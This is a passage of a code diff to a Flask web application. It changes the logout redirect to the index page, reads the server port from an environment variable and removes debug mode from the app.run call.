   session.pop("admin_logged_in", None)
-  return redirect(url_for("admin_login"))
+  return redirect(url_for("index"))
 
 
 @app.route("/uploads/<filename>")
@@ -1605,4 +1587,5 @@ def uploaded_file(filename):
 
 
 if __name__ == "__main__":
-  app.run(host="0.0.0.0", port=5000, debug=True)
+  port = int(os.environ.get("PORT", 5001))
+  app.run(host="0.0.0.0", port=port)
